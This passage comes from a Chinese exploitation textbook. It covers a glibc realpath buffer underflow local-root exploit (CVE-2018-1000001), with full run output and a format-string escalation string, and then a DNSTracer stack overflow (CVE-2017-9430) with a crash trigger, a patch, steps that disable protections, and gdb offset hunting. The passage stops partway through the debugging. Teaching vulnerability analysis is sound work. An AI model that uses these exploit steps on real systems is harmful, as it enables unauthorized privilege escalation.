出错误信息，此时第一阶段的 message catalogue 文件被加载，里面的格式化字符
串将内存 dump 到 stderr，然后正如上面所讲的设置 restricted 字段，并将一
个 L 写到喷射栈中，将其中一个环境变量修改为正确的 "LANGUAGE=X.X"。
由于语言发生了改变，umount 将尝试加载另一种语言的 catalogue。此时 umount
会有一个阻塞时间用于创建一个新的 message catalogue，漏洞利用得以同步进
行，然后 umount 继续执行。
更新后的格式化字符串现在包含了当前程序的所有偏移。但是堆栈中却没有合适的
指针用于写入，同时因为 fprintf 必须调用相同的格式化字符串，且每次调用需要覆
盖不同的内存地址，这里采用一种简化的虚拟机的做法，将每次 fprintf 的调用作为
时钟，路径名的长度作为指令指针。格式化字符串重复处理的过程将返回地址从主
函数转移到了 getdate() 和 execl() 两个函数中，然后利用这两个函数做
ROP。
被调用的程序文件中包含一个 shebang（即"#!"），使系统调用了漏洞利用程序作
为它的解释器。然后该漏洞利用程序修改了它的所有者和权限，使其变成一个
SUID 程序。当 umount 最初的调用者发现文件的权限发生了变化，它会做一定的
清理并调用 SUID 二进制文件的辅助功能，即一个 SUID shell，完成提权。
1591
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
Bingo!!!（需要注意的是其所支持的系统被硬编码进了利用代码中，可看情况进行修
改。exp）
$ gcc -g exp.c
$ id
uid=999(ubuntu) gid=999(ubuntu) groups=999(ubuntu),4(adm),24(cdr
om),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ ls -l a.out
-rwxrwxr-x 1 ubuntu ubuntu 44152 Feb 1 03:28 a.out
$ ./a.out
./a.out: setting up environment ...
Detected OS version: "16.04.3 LTS (Xenial Xerus)"
./a.out: using umount at "/bin/umount".
No pid supplied via command line, trying to create a namespace
CAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on
systems with USERNS protection.
Namespaced filesystem created with pid 7429
Attempting to gain root, try 1 of 10 ...
Starting subprocess
Stack content received, calculating next phase
Found source address location 0x7ffc3f7bb168 pointing to target
address 0x7ffc3f7bb238 with value 0x7ffc3f7bd23f, libc offset is
0x7ffc3f7bb158
Changing return address from 0x7f24986c4830 to 0x7f2498763e00, 0
x7f2498770a20
Using escalation string %69$hn%73$hn%1$2592.2592s%70$hn%1$13280.
13280s%66$hn%1$16676.16676s%68$hn%72$hn%1$6482.6482s%67$hn%1$1.1
s%71$hn%1$26505.26505s%1$45382.45382s%1$s%1$s%65$hn%1$s%1$s%1$s%
1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-
%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$s
Executable now root-owned
Cleanup completed, re-invoking binary
/proc/self/exe: invoked as SUID, invoking shell ...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo)
,30(dip),46(plugdev),113(lpadmin),128(sambashare),999(ubuntu)
# ls -l a.out
-rwsr-xr-x 1 root root 44152 Feb 1 03:28 a.out
1592
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
参考资料
LibcRealpathBufferUnderflow
https://github.com/5H311-1NJ3C706/local-root-
exploits/tree/master/linux/CVE-2018-1000001
man 3 getcwd ， man 3 realpath ， man mount_namespaces
util-linux/sys-utils/umount.c
1593
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
漏洞描述
漏洞复现
漏洞分析
Exploit
参考资料
下载文件
漏洞描述
DNSTracer 是一个用来跟踪 DNS 解析过程的应用程序。DNSTracer 1.9 及之前的
版本中存在栈缓冲区溢出漏洞。攻击者可借助带有较长参数的命令行利用该漏洞造
成拒绝服务攻击。
漏洞复现
推荐使用的环境 备注
操作系统 Ubuntu 12.04 体系结构：32 位
调试器 gdb-peda 版本号：7.4
漏洞软件 DNSTracer 版本号：1.9
首先编译安装 DNSTracer：
$ wget http://www.mavetju.org/download/dnstracer-1.9.tar.gz
$ tar zxvf dnstracer-1.9.tar.gz
$ cd dnstracer-1.9
$ ./confugure
$ make && sudo make install
传入一段超长的字符串作为参数即可触发栈溢出：
$ dnstracer -v $(python -c 'print "A"*1025')
1594
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
*** buffer overflow detected ***: dnstracer terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb757f377]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x68)[0xb760f6b8]
/lib/i386-linux-gnu/libc.so.6(+0xf58a8)[0xb760d8a8]
/lib/i386-linux-gnu/libc.so.6(+0xf4e9f)[0xb760ce9f]
dnstracer[0x8048f26]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7530637
]
dnstracer[0x804920a]
======= Memory map: ========
08048000-0804e000 r-xp 00000000 08:01 270483 /usr/local/bin/
dnstracer
0804f000-08050000 r--p 00006000 08:01 270483 /usr/local/bin/
dnstracer
08050000-08051000 rw-p 00007000 08:01 270483 /usr/local/bin/
dnstracer
08051000-08053000 rw-p 00000000 00:00 0
084b6000-084d7000 rw-p 00000000 00:00 0 [heap]
b74e4000-b7500000 r-xp 00000000 08:01 394789 /lib/i386-linux
-gnu/libgcc_s.so.1
b7500000-b7501000 rw-p 0001b000 08:01 394789 /lib/i386-linux
-gnu/libgcc_s.so.1
b7518000-b76c8000 r-xp 00000000 08:01 394751 /lib/i386-linux
-gnu/libc-2.23.so
b76c8000-b76ca000 r--p 001af000 08:01 394751 /lib/i386-linux
-gnu/libc-2.23.so
b76ca000-b76cb000 rw-p 001b1000 08:01 394751 /lib/i386-linux
-gnu/libc-2.23.so
b76cb000-b76ce000 rw-p 00000000 00:00 0
b76e4000-b76e7000 rw-p 00000000 00:00 0
b76e7000-b76e9000 r--p 00000000 00:00 0 [vvar]
b76e9000-b76eb000 r-xp 00000000 00:00 0 [vdso]
b76eb000-b770d000 r-xp 00000000 08:01 394723 /lib/i386-linux
-gnu/ld-2.23.so
b770d000-b770e000 rw-p 00000000 00:00 0
b770e000-b770f000 r--p 00022000 08:01 394723 /lib/i386-linux
-gnu/ld-2.23.so
b770f000-b7710000 rw-p 00023000 08:01 394723 /lib/i386-linux
-gnu/ld-2.23.so
1595
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
bf8e5000-bf907000 rw-p 00000000 00:00 0 [stack]
Aborted (core dumped)
漏洞分析
这个漏洞非常简单也非常典型，发生原因是在把参数 argv[0] 复制到数组
argv0 的时候没有做长度检查，如果大于 1024 字节，就会导致栈溢出：
// dnstracer.c
int
main(int argc, char **argv)
{
[...]
char argv0[NS_MAXDNAME];
[...]
strcpy(argv0, argv[0]);
// dnstracer_broker.h
#ifndef NS_MAXDNAME
#define NS_MAXDNAME 1024
#endif
补丁
要修这个漏洞的话，在调用 strcpy() 前加上对参数长度的检查就可以了：
1596
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
/*CVE-2017-9430 Fix*/
if(strlen(argv[0]) >= NS_MAXDNAME)
{
free(server_ip);
free(server_name);
fprintf(stderr, "dnstracer: argument is too long %s\n",
argv[0]);
return 1;
}
// check for a trailing dot
strcpy(argv0, argv[0]);
Exploit
首先修改 Makefile，关掉栈保护，同时避免 gcc 使用安全函数 __strcpy_chk()
替换 strcpy() ，修改编译选项如下：
$ cat Makefile | grep -w CC
CC = gcc -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0
COMPILE = $(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPP
FLAGS) \
CCLD = $(CC)
$ make && sudo make install
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : disabled
PIE : disabled
RELRO : Partial
最后关掉 ASLR：
# echo 0 > /proc/sys/kernel/randomize_va_space
1597
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
因为漏洞发生在 main 函数中，堆栈的布置比起在子函数里也要复杂一些。大体过
程和前面写过的一篇 wget 溢出漏洞差不多，但那一篇是 64 位程序，所以这里选择
展示一下 32 位程序。
在 gdb 里进行调试，利用 pattern 确定溢出位置，1060 字节就足够了：
gdb-peda$ pattern_create 1060
gdb-peda$ pattern_offset $ebp
1849771630 found at offset: 1049
所以返回地址位于栈偏移 1049+4=1053 的地方。
gdb-peda$ disassemble main
0x08048df8 : mov DWORD PTR [esp+0x4],edi
0x08048dfc : mov DWORD PTR [esp],ebx
0x08048dff : call 0x8048950 
0x08048e04 : xor eax,eax
0x08048e06 : mov ecx,esi
...
0x08048f6e : mov DWORD PTR [esp+0x4],esi
0x08048f72 : call 0x804adb0 
0x08048f77 : mov DWORD PTR [esp],0xa
在下面几个地方下断点，并根据偏移调整我们的输入：
gdb-peda$ b *main+815
gdb-peda$ b *main+820
gdb-peda$ b *main+1186
gdb-peda$ r `perl -e 'print "A"x1053 . "BBBB"'`
[----------------------------------registers--------------------
---------------]
EAX: 0x1
EBX: 0xbfffeb3f --> 0xffed9cb7
ECX: 0x0
EDX: 0xb7fc7180 --> 0x0
ESI: 0xffffffff
EDI: 0xbffff174 ('A' ...)
EBP: 0xbfffef58 --> 0x0
1598
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
ESP: 0xbfffe6d0 --> 0xbfffeb3f --> 0xffed9cb7
EIP: 0x8048dff (: call 0x8048950 )
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048df1 : lea ebx,[esp+0x46f]
0x8048df8 : mov DWORD PTR [esp+0x4],edi
0x8048dfc : mov DWORD PTR [esp],ebx
=> 0x8048dff : call 0x8048950 
0x8048e04 : xor eax,eax
0x8048e06 : mov ecx,esi
0x8048e08 : repnz scas al,BYTE PTR es:[edi]
0x8048e0a : not ecx
Guessed arguments:
arg[0]: 0xbfffeb3f --> 0xffed9cb7
arg[1]: 0xbffff174 ('A' ...)
[------------------------------------stack----------------------
---------------]
0000| 0xbfffe6d0 --> 0xbfffeb3f --> 0xffed9cb7
0004| 0xbfffe6d4 --> 0xbffff174 ('A' ...)
0008| 0xbfffe6d8 --> 0x804be37 ("4cCoq:r:S:s:t:v")
0012| 0xbfffe6dc --> 0x0
0016| 0xbfffe6e0 --> 0x0
0020| 0xbfffe6e4 --> 0x0
0024| 0xbfffe6e8 --> 0x0
0028| 0xbfffe6ec --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x08048dff in main (argc=, argv=) at dnstracer.c:1622
1622 strcpy(argv0, argv[0]);
gdb-peda$ x/10wx argv0
0xbfffeb3f: 0xffed9cb7 0x000000bf 0x00000100 0x00000
200
0xbfffeb4f: 0xe33b9700 0xfdcac0b7 0x000000b7 0xffeff
400
0xbfffeb5f: 0xe24e08b7 0x000001b7
1599
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
所以栈位于 0xbfffeb3f ，执行这一行代码即可将 0xbffff174 处的 "A" 字符
串复制到 argv0 数组中：
gdb-peda$ c
Continuing.
[----------------------------------registers--------------------
---------------]
EAX: 0xbfffe6bf ('A' ...)
EBX: 0xbfffe6bf ('A' ...)
ECX: 0xbffff1d0 ("BBBB")
EDX: 0xbfffeadc ("BBBB")
ESI: 0x0
EDI: 0xbfffedb3 ('A' ...)
EBP: 0xbfffead8 ("AAAABBBB")
ESP: 0xbfffe290 --> 0xbfffe6bf ('A' ...)
EIP: 0x8048dba (: mov ecx,DWORD PTR [ebp-0x82c])
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048db3 : push edi
0x8048db4 : push ebx
0x8048db5 : call 0x8048920 
=> 0x8048dba : mov ecx,DWORD PTR [ebp-0x82c]
0x8048dc0 : xor eax,eax
0x8048dc2 : add esp,0x10
0x8048dc5 : repnz scas al,BYTE PTR es:[edi]
0x8048dc7 : not ecx
[------------------------------------stack----------------------
---------------]
0000| 0xbfffe290 --> 0xbfffe6bf ('A' ...)
0004| 0xbfffe294 --> 0xbfffedb3 ('A' ...)
0008| 0xbfffe298 --> 0xffffffff
0012| 0xbfffe29c --> 0xffffffff